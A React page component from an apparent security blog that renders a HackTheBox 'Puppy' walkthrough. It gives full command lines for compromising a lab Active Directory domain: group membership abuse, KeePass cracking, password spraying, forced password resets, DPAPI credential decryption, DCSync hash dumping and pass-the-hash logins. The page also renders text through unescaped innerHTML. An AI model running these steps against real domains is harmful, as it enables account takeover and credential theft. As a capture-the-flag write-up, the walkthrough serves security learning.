import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import './PuppyWalkthrough.css';

// CodeBlock component with copy functionality
const CodeBlock = ({ language, children }) => {
  const [copied, setCopied] = useState(false);
  
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(children);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

  // Add terminal prompt for bash/shell commands
  const displayLanguage = language === 'bash' ? 'Shell' : language;
  const showPrompt = language === 'bash' || language === 'shell';

  return (
    <div className="code-block-container">
      <div className="code-block-header">
        <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
        <button 
          className={`copy-button ${copied ? 'copied' : ''}`}
          onClick={handleCopy}
          title={copied ? 'Copied!' : 'Copy to clipboard'}
        >
          {copied ? <FaCheck /> : <FaCopy />}
        </button>
      </div>
      <pre>
        <code className={`terminal-code ${language ? `language-${language}` : ''}`}>
          {showPrompt && <span className="terminal-prompt">$ </span>}
          {children}
        </code>
      </pre>
    </div>
  );
};

const PuppyWalkthrough = () => {
  const navigate = useNavigate();
  // Puppy Walkthrough data
  const writeup = {
    id: 'puppy-walkthrough',
    title: 'Puppy Walkthrough',
    excerpt: 'Puppy is an medium-difficulty Windows Active Directory machine built around an assumed-breach scenario where credentials for a low-privileged user are provided (levi.james / KingofAkron2025!). Initial SMB/BloodHound enumeration reveals GenericWrite on the Developers group, allowing the attacker to add the user and access the DEV share. A KeePass file harvested from DEV is cracked to recover additional credentials. A password-spraying and further enumeration lead to steph.cooper and extraction of DPAPI-protected secrets. Using steph.cooper_adm recovered credentials the box allows DCSync to dump the Administrator hash, enabling remote authentication and full domain compromise.',
    date: 'Sep 27, 2025',
    tags: ['Htb', 'Ad', 'DPAPI', 'Password-Cracking', 'Kerberos', 'Smb', 'Ldap', 'Windows', 'Dcsync'],
    difficulty: 'Medium',
    os: 'Windows',
    ip: '10.129.194.51',
    content: `# Puppy Walkthrough

## Overview
Puppy is an medium-difficulty Windows Active Directory machine built around an assumed-breach scenario where credentials for a low-privileged user are provided (levi.james / KingofAkron2025!). Initial SMB/BloodHound enumeration reveals \`GenericWrite\` on the Developers group, allowing the attacker to add the user and access the \`DEV\` share. A KeePass file harvested from \`DEV\` is cracked to recover additional credentials. A password-spraying and further enumeration lead to \`steph.cooper\` and extraction of DPAPI-protected secrets. Using \`steph.cooper_adm\` recovered credentials the box allows \`DCSync\` to dump the Administrator hash, enabling remote authentication and full domain compromise.
<InfoStatus title="Info Status:" message="As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!" />

## Enumeration
### Port Scanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows machine with \`Active Directory\` services. The scan reveals several critical ports including LDAP (389, 636, 3268, 3269), Kerberos (88), SMB (445, 139), and WinRM (5985), which are typical indicators of an Active Directory Domain Controller. Additionally, we can see NFS services on port 2049 and various RPC services, suggesting this is a comprehensive Windows environment with multiple service offerings.
\`\`\`bash
sudo nmap -vv -sS -Pn -sV -sC -p- --min-rate=10000 10.129.194.51 -oN nmap/log.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-18 09:22:58Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26334/tcp): CLEAN (Timeout)
|   Check 2 (port 62054/tcp): CLEAN (Timeout)
|   Check 3 (port 22859/udp): CLEAN (Timeout)
|   Check 4 (port 45655/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-05-18T09:24:50
|_  start_date: N/A
\`\`\`

We can see some important open ports:
• **Port 53**: DNS service running Simple DNS Plus
• **Port 88**: Kerberos service running Microsoft Windows Kerberos
• **Port 111**: RPC service running rpcbind 2-4
• **Port 135**: Microsoft Windows RPC service
• **Port 139**: NetBIOS service running Microsoft Windows netbios-ssn
• **Port 389**: LDAP service running Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0.)
• **Port 445**: Microsoft-DS service
• **Port 636**: LDAP over SSL service

Adding domains into hosts file.
\`\`\`bash
echo '10.129.194.51 puppy.htb dc.puppy.htb' | sudo tee -a /etc/hosts
\`\`\`

### Service Enumeration
\`\`\`bash
nxc smb 10.129.194.51 -u 'levi.james' -p 'KingofAkron2025!' --shares
\`\`\`
![Service Enumeration](/images/writeups/puppy/1.png)

Making a collection on Active Directory with \`bloodhound-python\`. This tool will map out the entire Active Directory structure, including users, groups, computers, and their relationships, which is crucial for understanding potential attack paths and privilege escalation opportunities.
\`\`\`bash
bloodhound-python -u "levi.james" -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.194.51 -c ALL --zip
\`\`\`

We can see that the \`levi.james\` user has GenericWrite into \`Developers\` group.
![Service Enumeration](/images/writeups/puppy/2.png)

## Foothold
### Exploitation
Using \`net rpc group addmem\` to add the \`levi.james\` user to the \`Developers\` group.
\`\`\`bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "dc.puppy.htb" /
net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "dc.puppy.htb"
\`\`\`
![Foothold](/images/writeups/puppy/3.png)

### Enumerating users from AD

Enumerating all users from Active Directory, filtering and saving into the \`users.txt\` file. This comprehensive user enumeration will help us identify potential targets for further exploitation and understand the organizational structure of the domain.
\`\`\`bash
nxc smb 10.129.194.51 -u 'levi.james' -p 'KingofAkron2025!' --rid-brute /
cat a | grep "SidTypeUser" awk -F " " '{print $6}' | cut -d '\\' -f 2 > users.txt
\`\`\`
![Foothold](/images/writeups/puppy/4.png)

Members of \`Developer\` group have read access into \`DEV\` share folder. On that share we found a Keepass file.
\`\`\`bash
smbclient.py 'levi.james:KingofAkron2025!'@10.129.194.51
\`\`\`
![Foothold](/images/writeups/puppy/5.png)

Cracking the Keepass password with \`john\`.
\`\`\`bash
john keepasshash --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`
![Keepass Password Crack](/images/writeups/puppy/6.png)

Retrieving all passwords from the Keepass file and saving into the \`passwords.txt\`.
![Keepass Passwords](/images/writeups/puppy/7.png)
![Keepass Passwords](/images/writeups/puppy/9.png)

Making a password spray into the users and the passwords. We found a valid password for \`ant.edward\` user.
\`\`\`bash
nxc smb 10.129.194.51 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
\`\`\`
![Keepass Password Crack](/images/writeups/puppy/8.png)

## Post Exploitation
### Lateral Movement - GenericAll
The \`ant.edward\` user it's part of a group that have GenericAll privilege into \`adam.silver\` user.
![GenericAll](/images/writeups/puppy/10.png)

We can change the password from \`adam.silver\` user. We also need to enable the account.
\`\`\`bash
net rpc password "adam.silver" "newP@ssword2022" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
bloodyAD -u ant.edwards -d puppy.htb -p 'Antman2025!' --host 10.129.194.51 remove uac adam.silver -f ACCOUNTDISABLE
\`\`\`
![Changing Password](/images/writeups/puppy/11.png)
![User Flag](/images/writeups/puppy/13.png)

### User Flag
We can authenticate via WinRM with \`adam.silver\` user.
\`\`\`bash
nxc winrm 10.129.194.51 -u adam.silver -p 'newP@ssword2022'
\`\`\`
![User Flag](/images/writeups/puppy/12.png)

Authenticating via Evil-WinRM with \`adam.silver\` user and retrieving the user flag.
\`\`\`bash
evil-winrm -i 10.129.194.51 -u 'adam.silver' -p 'newP@ssword2022'
\`\`\`
![User Flag](/images/writeups/puppy/14.png)

### Lateral Movement - Backup File
Found a directory \`Backup\` with a zip file:
![Backup Directory](/images/writeups/puppy/15.png)

Downloaded the zip file. We can make a recursive grep to find a password.
\`\`\`bash
grep -iR password .
\`\`\`
![Backup file](/images/writeups/puppy/16.png)

Password spraying again to find a valid user for this password. We can see that the user \`steph.cooper\` uses this password.
\`\`\`bash
nxc smb 10.129.194.51 -u users.txt -p 'ChefSteph2025!' --no-bruteforce --continue-on-success
\`\`\`
![Steph Cooper Password](/images/writeups/puppy/17.png)

### Lateral Movement - DPAPI
The \`steph.cooper\` user is member of \`Remote Management Users\`:
![DPAPI](/images/writeups/puppy/18.png)

Authenticating via WinRM and viewing the privileges from \`steph.cooper\`:
\`\`\`bash
evil-winrm -i 10.129.194.51 -u 'steph.cooper' -p 'ChefSteph2025!'
\`\`\`
![DPAPI](/images/writeups/puppy/19.png)

We can see the DPAPI files on \`AppData\\\\Roaming\\\\Microsoft\` directory. Copy all \`Credential\` and \`Protect\` files to a folder that our user have access.
\`\`\`bash
mkdir C:/temp
cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:/temp
cp 556a2412-1275-4ccf-b721-e6a0b4f90407 C:/temp
\`\`\`
![DPAPI](/images/writeups/puppy/20.png)
![DPAPI](/images/writeups/puppy/21.png)


Making all files visible.
\`\`\`bash
attrib -s -h C:/temp/556a2412-1275-4ccf-b721-e6a0b4f90407
attrib -s -h C:/temp/C8D69EBE9A43E9DEBF6B5FBD48B521B9
\`\`\`
![DPAPI](/images/writeups/puppy/22.png)

Download those files into our machine. We can use the the impacket tool to retrieve the protect key.
\`\`\`bash
dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107' -password 'ChefSteph2025!'
\`\`\`
![DPAPI Master Key](/images/writeups/puppy/29.png)

Passing the key and retrieving the \`steph.cooper_adm\` credentials.
\`\`\`bash
dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
\`\`\`
![DPAPI Credentials](/images/writeups/puppy/23.png)

Validating credentials from \`steph.cooper_adm\` user.
\`\`\`bash
nxc smb 10.129.194.51 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
\`\`\`
![Credential Validation](/images/writeups/puppy/24.png)

## Privilege Escalation
The user \`steph.cooper_adm\` has permissions to make a DCSync into the host:
![DCSync Permissions](/images/writeups/puppy/25.png)

Dumping administrator hash.
\`\`\`bash
secretsdump.py steph.cooper_adm:'FivethChipOnItsWay2025!'@10.129.194.51 -just-dc-user Administrator
\`\`\`
![Administrator Hash](/images/writeups/puppy/26.png)

### Root Flag
Validating the Administrator hash.
\`\`\`bash
nxc winrm 10.129.194.51 -u Administrator -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
\`\`\`
![Administrator Validation](/images/writeups/puppy/27.png)

Authenticating as Administrator and retrieving the root flag.
\`\`\`bash
evil-winrm -i 10.129.194.51 -u Administrator -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
\`\`\`
![Root Flag](/images/writeups/puppy/28.png)

# Conclusion
This machine demonstrated various Windows Active Directory exploitation techniques including:
• Group membership manipulation
• Password spraying attacks
• DPAPI credential extraction
• DCSync privilege escalation
• Lateral movement through multiple user accounts

# Tools Used
• Nmap - Port scanning and service enumeration
• NetExec (nxc) - SMB enumeration and authentication testing
• BloodHound - Active Directory enumeration
• John the Ripper - Password cracking
• KeePass - Password manager exploitation
• Evil-WinRM - Remote management
• Impacket - DPAPI and secrets dumping
• BloodyAD - Active Directory manipulation

# References
• HackTheBox Puppy machine
• Active Directory exploitation techniques
• DPAPI credential extraction methods
• DCSync attack vectors`
  };

  return (
    <motion.div 
      className="writeup-detail-page"
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6 }}
    >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/puppy/machine.png" alt="Puppy Walkthrough" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const match = line.match(/<InfoStatus\s+title="([^"]+)"\s+message="([^"]+)"\s*\/>/);
                  if (match) {
                    const [, title, message] = match;
                    elements.push(
                      <InfoStatus key={i} title={title} message={message} />
                    );
                  }
                } else if (line.trim()) {
                  // Process inline markdown
                  const processedLine = line
                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
                    .replace(/\*(.*?)\*/g, '<em>$1</em>') // Italic
                    .replace(/`(.*?)`/g, '<code class="inline-code">$1</code>'); // Inline code
                  
                  elements.push(
                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />
                  );
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
    </motion.div>
  );
};

export default PuppyWalkthrough;
